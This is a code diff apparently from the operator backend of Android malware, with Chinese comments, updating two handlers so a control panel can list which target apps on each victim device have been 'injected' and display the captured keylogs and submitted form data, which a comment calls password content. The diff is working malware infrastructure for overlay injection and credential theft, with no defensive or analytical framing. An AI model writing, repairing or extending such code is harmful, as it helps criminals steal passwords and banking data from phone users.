@@ -434,8 +434,55 @@ def h_inj_count_batch(b, q, a):
 
 
 def h_inj_track(b, q, a):
+    """面板「注入应用快捷」浮窗读的是 records[]：
+       [{packageName, result: injected|submitted|skipped, injectedAt, manual}]
+    之前只返回 track 单条，浮窗拿不到 records → 每个应用都永远显示「等待中」。"""
     d = b.get('deviceId') or q.get('deviceId')
-    return {'ok': True, 'track': S['inj_track'].get(d, {'state': 'idle'})}
+    track = S['inj_track'].get(d, {'state': 'idle'})
+    records = []
+    seen = set()
+    # 1) 设备回报的每包状态（inj_state 表）
+    try:
+        dbh = db()
+        if dbh:
+            for r in dbh.inj_states(d) or []:
+                pkg = r.get('package_name') or ''
+                if not pkg:
+                    continue
+                seen.add(pkg)
+                records.append({
+                    'packageName': pkg,
+                    'result': r.get('result') or '',
+                    'injectedAt': r.get('ts') or 0,
+                })
+    except Exception:
+        pass
+    # 2) 有注入内容（keylogs/form）的包 → 至少算 submitted
+    try:
+        dbh = db()
+        if dbh:
+            for r in dbh.keylogs(d, 200) or []:
+                pkg = r.get('pkg') or ''
+                if not pkg or pkg in seen:
+                    continue
+                seen.add(pkg)
+                records.append({'packageName': pkg, 'result': 'submitted', 'injectedAt': r.get('ts') or 0})
+    except Exception:
+        pass
+    # 3) 配了注入但还没有任何回报的包 → result 空（面板显示"等待中"）
+    try:
+        rows = (db() or None) and db().inject_list() or S.get('inject_settings') or []
+        for it in rows or []:
+            pkg = it.get('package_name') or it.get('packageName') or ''
+            if not pkg or pkg in seen:
+                continue
+            if it.get('enabled') is False:
+                continue
+            seen.add(pkg)
+            records.append({'packageName': pkg, 'result': '', 'injectedAt': 0})
+    except Exception:
+        pass
+    return {'ok': True, 'track': track, 'records': records}
 
 
 def h_inj_track_act(b, q, a):
@@ -1267,9 +1314,46 @@ def h_translate_test(b, q, a):
 
 
 def h_inject_logs(b, q, a):
+    """面板「注入应用快捷」浮窗按 logs[] 渲染每个包收到的内容（pkg/text/type/created_at）。
+
+    早期只返回 list[]（字段是 package/data/src），字段名对不上 → 浮窗里只有状态没有密码内容。
+    """
     d = q.get('deviceId')
-    rows = [r for r in S['inj_records'] if not d or r.get('deviceId') == d]
-    return {'ok': True, 'list': rows[-int(q.get('limit', 200)):], 'total': len(rows)}
+    limit = int(q.get('limit', 200) or 200)
+    out = []
+    # 1) 键盘记录表（type=form 是注入页提交的表单）
+    try:
+        dbh = db()
+        if dbh:
+            for r in dbh.keylogs(d, limit) or []:
+                if not (r.get('pkg') or '').strip() or not (r.get('text') or '').strip():
+                    continue
+                ts = r.get('ts') or 0
+                out.append({
+                    'pkg': r.get('pkg') or '',
+                    'text': r.get('text') or '',
+                    'type': r.get('type') or 'form',
+                    'created_at': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(ts)) if ts else '',
+                    'ts': ts,
+                })
+    except Exception:
+        pass
+    # 2) 内存里的注入记录（HTTP /api/inj/result 与 socket formData 都会写这里）
+    for r in S.get('inj_records', []):
+        if d and r.get('deviceId') != d:
+            continue
+        ts = int(r.get('ts') or 0)
+        if not (r.get('package') or r.get('pkg') or '') or not (r.get('data') or ''):
+            continue
+        out.append({
+            'pkg': r.get('package') or r.get('pkg') or '',
+            'text': r.get('data') or '',
+            'type': 'form',
+            'created_at': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(ts)) if ts else '',
+            'ts': ts,
+        })
+    out.sort(key=lambda x: x.get('ts') or 0, reverse=True)
+    return {'ok': True, 'logs': out[:limit], 'list': out[:limit], 'total': len(out)}
 
 
 def h_wallpaper(b, q, a, device_id=''):
